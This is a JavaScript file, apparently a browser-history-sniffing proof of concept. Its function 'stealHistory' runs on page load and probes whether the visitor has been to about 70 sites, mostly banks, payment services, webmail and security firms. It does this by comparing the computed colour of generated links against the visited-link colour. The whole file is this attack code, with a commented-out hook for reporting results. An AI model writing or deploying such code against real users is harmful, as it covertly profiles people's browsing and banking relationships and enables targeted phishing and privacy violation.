$(stealHistory);

var IEVisitedColor 	= '#cd0018';
var W3CVisitedColor	= 'rgb(205, 0, 24)';

var websites = [
  "http://ajaxian.com/",
  "http://digg.com/",
  "http://english.aljazeera.net/HomePage",
  "http://ha.ckers.org",
  "http://ha.ckers.org/blog/",
  "http://jeremiahgrossman.blogspot.com/",
  "http://login.yahoo.com/",
  "http://mail.google.com/",
  "http://mail.yahoo.com/",
  "http://my.yahoo.com/",
  "http://reddit.com/",
  "http://seoblackhat.com",
  "http://slashdot.org/",
  "http://techfoolery.com/",
  "http://weblogs.asp.net/jezell/",
  "http://www.amazon.com/",
  "http://www.aol.com/",
  "http://www.bankofamerica.com/",
  "http://www.bankone.com/",
  "http://www.blackhat.com/",
  "http://www.blogger.com/",
  "http://www.bloglines.com/",
  "http://www.bofa.com/",
  "http://www.capitalone.com/",
  "http://www.cenzic.com",
  "http://www.cgisecurity.com",
  "http://www.chase.com/",
  "http://www.citibank.com/",
  "http://www.cnn.com/",
  "http://www.comerica.com/",
  "http://www.e-gold.com/",
  "http://www.ebay.com/",
  "http://www.etrade.com/",
  "http://www.expedia.com/",
  "http://www.google.com/",
  "http://www.hsbc.com/",
  "http://www.icq.com/",
  "http://www.jailbabes.com",
  "http://www.microsoft.com/",
  "http://www.msn.com/",
  "http://www.myspace.com/",
  "http://www.ntobjectives.com",
  "http://www.passport.net/",
  "http://www.paypal.com/",
  "http://www.sourceforge.net/",
  "http://www.spidynamics.com",
  "http://www.statefarm.com/",
  "http://www.usbank.com/",
  "http://www.wachovia.com/",
  "http://www.wamu.com/",
  "http://www.watchfire.com",
  "http://www.webappsec.org",
  "http://www.wellsfargo.com/",
  "http://www.whitehatsec.com",
  "http://www.xanga.com/",
  "http://www.yahoo.com/",
  "http://seoblackhat.com/",
  "http://www.alexa.com/",
  "http://www.youtube.com/",
  "https://banking.wellsfargo.com/",
  "https://commerce.blackhat.com/",
  "https://online.wellsfargo.com/",
  "http://vdgraaf.info",
  "http://www.vdgraaf.info",
  "http://www.ropp.nl",
  "http://www.reaact.net",
  "http://www.printernational.org",
  "http://www.zuurkool.com",
  "http://www.bodegrafisch.nl",
  "http://www.flaminghomer.nl",
  "http://www.lowopacity.net",
  "http://www.quirksmode.org",
  "http://www.demessias.nl"
];

function stealHistory() {
	if( document.getElementById( 'site-list' ) )
	{
		var List = document.getElementById( 'site-list' );

		for( var i = 0; i < websites.length; i++ )
		{
			var bRemove		= false;
			var ListItem	= document.createElement( 'li' );
			var Link 		= document.createElement( 'a' );
			Link.href 		= websites[i];
			Link.id			= i;

			Link.appendChild( document.createTextNode( websites[i] ) );
			ListItem.appendChild( Link );
			List.appendChild( ListItem );

			if( Link.currentStyle )
			{
				var color = Link.currentStyle['color'];

				if( color == IEVisitedColor )
				{
					bRemove = true;
				}
			}
			else if( document.defaultView.getComputedStyle( Link, null ) )
			{
				var color = document.defaultView.getComputedStyle( Link, null ).color;

				if( color == W3CVisitedColor )
				{
					bRemove = true;
				}
			}
			/*
			// does not work in safari
			else if( window.getComputedStyle )
			{
				var color = window.getComputedStyle( Link, null ).color;

				if( color == W3CVisitedColor )
				{
					bRemove = true;
				}
			}
			*/

			if( bRemove == true )
			{
				List.removeChild( ListItem );
			}
			else
			{
				//doUrchin( websites[i], 'visited' );
			}
		}
	}
}

